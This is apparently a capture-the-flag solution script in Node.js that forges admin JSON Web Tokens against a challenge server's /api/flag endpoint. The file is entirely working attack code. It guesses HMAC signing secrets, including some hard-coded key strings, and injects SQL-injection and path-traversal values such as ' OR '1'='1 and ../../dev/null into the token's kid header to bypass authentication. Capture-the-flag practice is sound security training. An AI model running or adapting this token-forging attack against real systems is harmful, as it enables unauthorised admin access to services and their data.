import { createHmac, randomUUID } from "node:crypto";

const BASE = process.env.GHOST_BASE || "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf";

function b64(value) {
  const data = typeof value === "string" ? value : JSON.stringify(value);
  return Buffer.from(data).toString("base64url");
}

function hs256(header, payload, secret) {
  const head = b64(header);
  const body = b64(payload);
  const sig = createHmac("sha256", secret).update(`${head}.${body}`).digest("base64url");
  return `${head}.${body}.${sig}`;
}

const now = Math.floor(Date.now() / 1000);
const payload = {
  typ: "access",
  role: "admin",
  sub: "admin",
  iss: "ghost-packet-auth",
  aud: "ghost-packet-api",
  iat: now,
  jti: randomUUID(),
  exp: now + 1800,
};

const secrets = [
  "",
  "secret",
  "admin",
  "ghost",
  "ghost-packet-auth",
  "ghost-packet-api",
  "primary-rs256",
  "d7DwnkgQl8hNpMy1Wj7eIKJkjMagLA/U",
  Buffer.from("d7DwnkgQl8hNpMy1Wj7eIKJkjMagLA/U", "base64"),
  "+aK6ypBMf5N9yrYba7q/OYl1tKIqxF3B",
  Buffer.from("+aK6ypBMf5N9yrYba7q/OYl1tKIqxF3B", "base64"),
];

const kids = [
  "primary-rs256",
  "admin",
  "' OR '1'='1",
  "primary-rs256' OR '1'='1'--",
  "../../dev/null",
  "/dev/null",
];

for (const kid of kids) {
  for (const secret of secrets) {
    const token = hs256({ alg: "HS256", typ: "JWT", kid }, payload, secret);
    const res = await fetch(`${BASE}/api/flag`, {
      headers: { Authorization: `Bearer ${token}`, Accept: "application/json" },
    });
    const text = await res.text();
    if (res.status !== 401) {
      console.log(JSON.stringify({ kid, secret: Buffer.isBuffer(secret) ? `raw:${secret.toString("hex")}` : String(secret), status: res.status, text }));
    }
  }
}
